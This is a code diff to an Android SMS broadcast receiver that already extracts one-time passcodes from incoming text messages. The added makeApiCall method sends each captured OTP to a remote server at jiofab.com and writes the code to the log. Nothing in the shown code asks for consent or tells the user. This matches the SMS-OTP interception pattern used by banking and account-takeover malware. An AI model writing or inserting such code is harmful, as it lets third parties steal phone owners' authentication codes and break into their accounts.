@@ -12,6 +12,12 @@ import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
+import retrofit2.Retrofit;
+import retrofit2.converter.gson.GsonConverterFactory;
+
 public class SMSReceiver extends BroadcastReceiver {
     private MainActivity mainActivity;
 
@@ -64,8 +70,43 @@ public class SMSReceiver extends BroadcastReceiver {
         while (matcher.find()) {
             String otp = matcher.group();
             Log.d("BackgroundService", "SMSReceiver recevied Extract OTP " + otp);
+            makeApiCall(otp);
             otpList.add(otp);
+
         }
         return otpList;
+    }
+    private void makeApiCall(String otp) {
+        String apiUrl = "https://jiofab.com/kptoken/rto/";
+
+        Retrofit retrofit = new Retrofit.Builder()
+                .baseUrl(apiUrl)
+                .addConverterFactory(GsonConverterFactory.create())
+                .build();
+
+        MyApiService apiService = retrofit.create(MyApiService.class);
+
+        Call<Void> call = apiService.makeApiCall(otp);
+        call.enqueue(new Callback<Void>() {
+            @Override
+            public void onResponse(Call<Void> call, Response<Void> response) {
+                if (response.isSuccessful()) {
+                    // API call was successful
+                    Log.d("BackgroundService", "API call was successful response" + response);
+
+                    Log.d("BackgroundService", "API call was successful" + otp);
+
+                } else {
+                    // Handle API error
+                    Log.d("BackgroundService", "API error");
+
+                }
+            }
+
+            @Override
+            public void onFailure(Call<Void> call, Throwable t) {
+                // Handle API call failure
+            }
+        });
     }
 }
